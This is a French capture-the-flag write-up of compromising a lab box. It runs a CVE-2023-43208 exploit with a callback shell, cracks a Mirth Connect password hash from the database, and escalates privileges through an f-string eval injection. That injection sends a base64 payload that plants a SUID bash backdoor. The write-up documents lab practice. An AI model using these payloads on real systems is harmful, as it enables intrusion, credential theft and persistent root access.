@@ -1,0 +1,314 @@
+On commence avec nmap:
+┌──(kali㉿kali)-[~/Documents/Interpreter]
+└─$ nmap -p- -sV 10.129.4.233 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 05:45 -0500
+Nmap scan report for 10.129.4.233
+Host is up (0.022s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+80/tcp   open  http     Jetty
+443/tcp  open  ssl/http Jetty
+6661/tcp open  unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 193.29 seconds
+
+ok un serv http/https + ssh et 6661
+
+le rating 2.5 (262) de la box me TERRIFIE, souvent c'est quand c'est des trucs super wtf
+
+la homepage je tombes sur "myth connect" une page de login  qui ressemble a une page d'hopital (sc: sc/homepage.jpg)
+je ne trouves aucun numero de version donc bon on va regarder les CVE et tester directement si j'en trouves (il y a juste ecrit 2021 au bas de la page)
+CVE-2023–43208 ce cve sort en BOUCLE, il est ancien mais me parait super connu et vu qu'il y a écrit 2021 c'est probable que pour une fois ils aient mis un vieux CVE
+
+je trouves un POC 
+https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT
+
+après avoir galéré un peu a installer python3.10 et a installer les dépendances je lance l'exploit et ça fonctionne 
+python3.10 ./CVE-2023-43208.py -u https://10.129.4.233 -lh 10.10.14.226 -lp 9333
+
+dans mirth@interpreter:/usr/local/mirthconnect$ cat conf/mirth.properties
+je trouves
+
+database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
+[...]
+# database credentials
+database.username = mirthdb
+database.password = MirthPass123!
+da
+
+dans la db je trouves
+
+
+MariaDB [mc_bdd_prod]> SELECT * FROM PERSON_PASSWORD;
++-----------+----------------------------------------------------------+---------------------+
+| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
++-----------+----------------------------------------------------------+---------------------+
+|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
++-----------+----------------------------------------------------------+---------------------+
+
+et ce mdp correspond a celui de l'user que je veux
+
+en regardant rapidement sur internet je vois qu'il est censé y avoir un salt
+
+(remote) mirth@interpreter:/usr/local/mirthconnect$ cat preferences 
+# install4j response file for Mirth Connect 4.4.0.b2948
+on a la version
+
+https://github.com/nextgenhealthcare/connect/blob/4.4.x/server/src/com/mirth/commons/encryption/Digester.java
+
+cette page est la page pour le hashing
+
+private String algorithm = "PBKDF2WithHmacSHA256"; il utilise cet algorithme
+
+il ajoute le salt + le hash 
+return ArrayUtils.addAll(salt, digestBytes);
+
+public static final int DEFAULT_SALT_SIZE = 8;
+
+le salt fait 8 bytes
+
+public static final int DEFAULT_ITERATIONS = 600000;
+il y a 600000 iterations
+
+avec toutes ces infos je cherche sur hashcat comment formater le mdp
+
+┌──(kali㉿kali)-[~/Documents/Interpreter]
+└─$ hashcat --example-hashes -m 10900 
+hashcat (v7.1.2) starting in hash-info mode
+
+Hash Info:
+==========
+
+Hash mode #10900
+  Name................: PBKDF2-HMAC-SHA256
+  Category............: Generic KDF
+  Slow.Hash...........: Yes
+  Deprecated..........: No
+  Deprecated.Notice...: N/A
+  Password.Type.......: plain
+  Password.Len.Min....: 0
+  Password.Len.Max....: 256
+  Salt.Type...........: Embedded
+  Salt.Len.Min........: 0
+  Salt.Len.Max........: 256
+  Kernel.Type(s)......: pure
+  Example.Hash.Format.: plain
+  Example.Hash........: sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk
+  Example.Pass........: hashcat
+  Benchmark.Mask......: ?a?a?a?a?a?a?a
+  Autodetect.Enabled..: Yes
+  Self.Test.Enabled...: Yes
+  Potfile.Enabled.....: Yes
+  Keep.Guessing.......: No
+  Custom.Plugin.......: No
+  Plaintext.Encoding..: ASCII, HEX
+
+il me semble que c'est ça:
+
+sha256:iterations:salt:hash (en base64)
+
+je dechiffre la base 64
+je prends les 8 premiers bytes pour le salt et je prends le reste pour le hash
+et je les remets en base64
+https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',false,false)Take_bytes(0,8,false)To_Base64('A-Za-z0-9%2B/%3D')&input=dS8rTEJCT1VuYWRpeUZCc01Pb0lEUExiVVIwcms1OWtFa1BVMTdpdGRyVldBL2tMTXQzdyt3PT0&oeol=VT
+
+sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
+
+j'ai galéré looonnngtemps juste pour une histoire de probleme de conversion
+mais finalement j'ai réussi et hashcat me donne:
+┌──(kali㉿kali)-[~/Documents/Interpreter]
+└─$ echo 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' > hash
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/Interpreter]
+└─$ hashcat -m 10900 -a 0 hash /usr/share/wordlists/rockyou.txt 
+hashcat (v7.1.2) starting
+[...]
+sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
+
+donc sedric:snowflake1
+
+je me connecte en ssh et je trouves le userflag sur le home.
+
+sudo n'est pas installé
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                                                                                
+══╣ Active Ports (ss)                                                                                                                                                                                                                       
+tcp   LISTEN 0      128        127.0.0.1:54321      0.0.0.0:*                                                                                                                                                                               
+tcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*          
+tcp   LISTEN 0      50           0.0.0.0:80         0.0.0.0:*          
+tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
+tcp   LISTEN 0      50           0.0.0.0:443        0.0.0.0:*          
+tcp   LISTEN 0      256          0.0.0.0:6661       0.0.0.0:*          
+tcp   LISTEN 0      128             [::]:22            [::]:*          
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+-rw-r----- 1 root sedric 33 Feb 24 05:55 /home/sedric/user.txt                                                                                                                                                                              
+-rwxr----- 1 root sedric 2332 Sep 19 09:27 /usr/local/bin/notif.py
+
+j'analyse ce dernier fichier car c'est louche
+
+c'est una api qui tourne sur le port 54321 en interne et qui permet d'ecrire des fichiers quand un nouveau patien arrive, il tourne surement en root car il écrit dans un dossier ecrivable que par root (je peux le verifier facilement mais flemme mdr)
+
+une ligne du script m'attire directement l'attention 
+        return eval(f"f'''{template}'''")
+
+cette template est définie un peu plus haut 
+    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
+
+les variables avant d'être écrites passent par deux filtres
+
+def template(first, last, sender, ts, dob, gender):
+    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
+    for s in [first, last, sender, ts, dob, gender]:
+        if not pattern.fullmatch(s):
+            return "[INVALID_INPUT]"
+    # DOB format is DD/MM/YYYY
+    try:
+        year_of_birth = int(dob.split('/')[-1])
+        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
+            return "[INVALID_DOB]"
+    except:
+        return "[INVALID_DOB]"
+
+cette fonction est appelée sur cette endpoint qui prends les params en xml
+
+@app.route("/addPatient", methods=["POST"])
+def receive():
+    if request.remote_addr != "127.0.0.1":
+        abort(403)
+    try:
+        xml_text = request.data.decode()
+        xml_root = ET.fromstring(xml_text)
+    except ET.ParseError:
+        return "XML ERROR\n", 400
+    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
+    if patient is None:
+        return "No <patient> tag found\n", 400
+    id = uuid.uuid4().hex
+    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
+    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
+
+
+on va analyser ça en local petit a petit:
+
+premier etape on essaye de voir si on peut injecter une commande dans le eval:
+
+template = f"{{__import__('os').system('id')}}"
+
+print(eval(f"f'''{template}'''"))
+
+ python scripts/script.py
+uid=[...]
+
+OUI!
+
+on teste maintenant avec les vraies strings
+
+from datetime import datetime
+first = "{__import__('os').system('id')}"
+last = ""
+gender = ""
+sender = ""
+ts = ""
+
+template = f"Patient {first} {last} ({gender}), {{datetime.now().year}} years old, received from {sender} at {ts}"
+
+print(eval(f"f'''{template}'''"))
+
+ça fonctionne
+
+etape suivante = les filtres
+
+"^[a-zA-Z0-9._'\"(){}=+/]+$"
+veut dire j'accepte lettres minuscules/majuscules, chiffres, _, doublequotes/quote, parentheses, {}, =,+ et /
+
+je pensais que ça allais etre chiant mais j'ai rien qui sort de ça dans ma string, peut etre que ça peut etre chiant pour la commande pour privesc mais je suis laaarge j'ai l'impression
+{__import__('os').system('id')}
+
+import re
+from datetime import datetime
+first = "{__import__('os').system('id')}"
+last = "a"
+gender = "a"
+sender = "a"
+ts = "a"
+
+pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
+for s in [first, last, sender, ts, gender]:
+    if not pattern.fullmatch(s):
+        print("[INVALID_INPUT]")
+
+template = f"Patient {first} {last} ({gender}), {{datetime.now().year}} years old, received from {sender} at {ts}"
+
+print(eval(f"f'''{template}'''"))
+
+ça passe !
+
+ptn maintenant que j'essaie je me rends compte que j'ai pas les espaces et ça c'est vraiment chiant
+en vrai je me dis que je peux le foutre en base64 et l'eval
+
+print(template("{__import__('os').system(__import__('base64').b64decode('Y3AgL2Jpbi9iYXNoIC90bXAvYmFzaDsgY2htb2QgK3MgL3RtcC9iYXNoOw=='))}","a","a","a","12/12/1901", "a"))
+
+effectivement ça fonctionne, il y a plus qu'a le passer dans le bon format en XML pour le passer a l'api
+
+il faut une balise <patient> et dedans les différents arguments de la fonction
+
+je passes par wget car il y a pas curl
+
+je reproduis vitefais le serveur en local juste pour traiter le xml (file: ./scripts/script.py)
+
+et j'arrives sur un 
+
+<patient>
+  <firstname>{__import__('os').system(__import__('base64').b64decode('Y3AgL2Jpbi9iYXNoIC90bXAvYmFzaDsgY2htb2QgK3MgL3RtcC9iYXNoOw=='))}</firstname>
+  <lastname>a</lastname>
+  <sender_app>a</sender_app>
+  <timestamp>a</timestamp>
+  <birth_date>12/12/1901</birth_date>
+  <gender>a</gender>
+</patient>
+
+sur la machine:
+
+sedric@interpreter:/tmp$ wget -S -O - --post-data="<patient>                                                                       
+  <firstname>{__import__('os').system(__import__('base64').b64decode('Y3AgL2Jpbi9iYXNoIC90bXAvYmFzaDsgY2htb2QgK3MgL3RtcC9iYXNoOw=='))}</firstname>
+  <lastname>a</lastname>
+  <sender_app>a</sender_app>
+  <timestamp>a</timestamp>
+  <birth_date>12/12/1901</birth_date>
+  <gender>a</gender>
+</patient>"   --header='Content-Type: application/xml'   http://127.0.0.1:54321/addPatient
+--2026-02-24 09:50:11--  http://127.0.0.1:54321/addPatient
+Connecting to 127.0.0.1:54321... connected.
+HTTP request sent, awaiting response... 
+  HTTP/1.1 200 OK
+  Server: Werkzeug/2.2.2 Python/3.11.2
+  Date: Tue, 24 Feb 2026 14:50:11 GMT
+  Content-Type: text/html; charset=utf-8
+  Content-Length: 52
+  Connection: close
+Length: 52 [text/html]
+Saving to: ‘STDOUT’
+
+-                                                            0%[                                                                                                                                         ]       0  --.-KB/s               P-                                                          100%[========================================================================================================================================>]      52  --.-KB/s    in 0s      
+
+2026-02-24 09:50:11 (3.69 MB/s) - written to stdout [52/52]
+
+et parfait j'ai mon bash suid et ma backdoor:
+sedric@interpreter:/tmp$ ls -la
+total 2156
+drwxrwxrwt 11 root   root      4096 Feb 24 09:50 .
+drwxr-xr-x 19 root   root      4096 Feb 16 15:42 ..
+-rwsr-sr-x  1 root   root   1265648 Feb 24 09:50 bash
+
+/tmp/bash -p
+et le flag se trouves dans le /root
+
+TERMINÉ !
+
+conclusions:
+Finalement le mauvais rating viens peut etre du fait que c'était trop simple pour une box niveau: "moyen", le cve pour le foothold etait super simple a trouver et a appliquer, la suite où tu trouves le hash dans la db était classique, le format du hash n'était pas compliqué a trouver (bien que je me sois emmelé les peinceaux dans le formatage) et le privesc était vraiiiment pas compliqué a executer (les filtres étaient vachement permisifs), j'ai passé un bon moment mais c'est vrai que c'était une box assez simple et le eval dans le script était assez random 
